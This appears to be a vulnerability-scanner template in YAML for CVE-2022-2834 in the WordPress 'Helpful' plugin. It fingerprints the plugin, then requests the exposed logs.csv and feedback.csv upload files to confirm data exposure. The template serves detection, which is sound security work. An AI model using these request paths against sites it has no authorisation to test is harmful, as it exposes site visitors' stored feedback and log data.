name: yaml-poc-helpful_project-helpful-leak-CVE-2022-2834
binding: 0c5ceb8d-3c6c-4b7e-8226-11275eb5bd8c
detail:
    author: jiapeng.han
    links:
        - https://cxsecurity.com/cveshow/CVE-2022-2834/
        - https://wpscan.com/vulnerability/468d5fc7-04c6-4354-b134-85ebb25b37ae
    vulnerability:
        id: dfea9a43-e55e-4a88-bfd8-aed6d66a4ff8
        level: medium
    warning: Harmless
transport: http
rules:
    check:
        request:
            cache: true
            method: GET
            path: /
            follow_redirects: true
        expression: response.status == 200 && response.body_string.contains("wp-content/plugins/helpful")
    r0:
        request:
            cache: true
            method: GET
            path: /wp-content/uploads/helpful/logs.csv
            follow_redirects: false
        expression: response.status == 200 && response.content_type.contains("csv")
    r1:
        request:
            cache: true
            method: GET
            path: /wp-content/uploads/helpful/feedback.csv
            follow_redirects: false
        expression: response.status == 200 && response.content_type.contains("csv")
expression: check() && (r0() || r1())
